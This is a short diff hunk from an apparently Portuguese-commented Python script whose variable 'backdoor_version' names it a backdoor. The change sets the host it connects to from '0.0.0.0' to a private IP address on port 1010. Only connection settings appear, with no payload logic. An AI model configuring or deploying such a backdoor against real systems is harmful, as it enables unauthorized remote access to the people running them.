@@ -18,8 +18,8 @@ off='\033[0m'
 fgreen='\033[42;97m'
 
 
-SERVER_HOST = '0.0.0.0'
-SERVER_PORT = 1010 #Change
+SERVER_HOST = '10.8.94.57' #o ip
+SERVER_PORT = 1010 #a porta a se conectar
 backdoor_version = "1.0"
 
 system=platform.system()
